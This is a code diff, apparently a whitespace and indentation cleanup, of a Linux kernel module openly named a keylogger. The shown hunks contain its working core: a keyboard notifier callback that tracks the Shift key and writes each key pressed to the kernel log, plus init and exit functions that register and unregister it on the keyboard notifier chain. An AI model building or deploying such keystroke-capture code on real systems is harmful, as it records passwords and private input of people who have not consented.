@@ -4,7 +4,7 @@
 #include <linux/module.h>	/* Needed by all modules */
 #include <linux/kernel.h>	/* Needed for KERN_INFO */
 #include <linux/init.h>		/* Needed for the macros */
-#include <linux/keyboard.h>  /* Needed for the notifier_block */
+#include <linux/keyboard.h>     /* Needed for the notifier_block */
 #include <linux/semaphore.h>
 
 #define DRIVER_AUTHOR "Arun Narasimhan <arunp@live.com>"
@@ -38,40 +38,39 @@ static int shiftKeyDepressed = 0;
 
 int keylogger_notify(struct notifier_block *nblock, unsigned long code, void *_param)
 {
-  struct keyboard_notifier_param *param = _param;
-
-  if (code == KBD_KEYCODE)
-  {
-    if( param->value==42 || param->value==54 )
+    struct keyboard_notifier_param *param = _param;
+    if (code == KBD_KEYCODE)
     {
-        //acquire lock to modify the global variable shiftKeyDepressed
-        down(&sem);
+        if( param->value==42 || param->value==54 )
+        {
+            //acquire lock to modify the global variable shiftKeyDepressed
+            down(&sem);
+            if(param->down)
+                shiftKeyDepressed = 1;
+            else
+                shiftKeyDepressed = 0;
+            up(&sem);
+            return NOTIFY_OK;
+        }
+
         if(param->down)
-            shiftKeyDepressed = 1;
-        else
-            shiftKeyDepressed = 0;
-        up(&sem);
-        return NOTIFY_OK;
+        {
+            //acquire lock to read the global variable shiftKeyDepressed
+            down(&sem);
+            if(shiftKeyDepressed == 0)
+                printk(KERN_DEBUG "%s \n", keymap[param->value]);
+            else
+                printk(KERN_DEBUG "%s \n", keymapShiftActivated[param->value]);
+            up(&sem);
+        }
     }
 
-    if(param->down)
-    {
-        //acquire lock to read the global variable shiftKeyDepressed
-        down(&sem);
-        if(shiftKeyDepressed == 0)
-            printk(KERN_DEBUG "%s \n", keymap[param->value]);
-        else
-            printk(KERN_DEBUG "%s \n", keymapShiftActivated[param->value]);
-        up(&sem);
-    }
-  }
-
-  return NOTIFY_OK;
+    return NOTIFY_OK;
 }
 
 static struct notifier_block keylogger_nb =
 {
-  .notifier_call = keylogger_notify
+    .notifier_call = keylogger_notify
 };
 
 
@@ -80,16 +79,16 @@ static int __init init_keylogger(void)
     /* Register this module with the notification list maintained by the keyboard driver.
     This will cause our "keylogger_notify" function to be called upon every key press and release event. This call is non-blocking.
     */
-	register_keyboard_notifier(&keylogger_nb);
+    register_keyboard_notifier(&keylogger_nb);
     printk(KERN_INFO "Registering the keylogger module with the keyboard notifier list\n");
     sema_init(&sem, 1);
-	return 0;
+    return 0;
 }
 
 static void __exit cleanup_keylogger(void)
 {
-	unregister_keyboard_notifier(&keylogger_nb);
-	printk(KERN_INFO "Unregistered the keylogger module \n");
+    unregister_keyboard_notifier(&keylogger_nb);
+    printk(KERN_INFO "Unregistered the keylogger module \n");
 }
 
 module_init(init_keylogger);
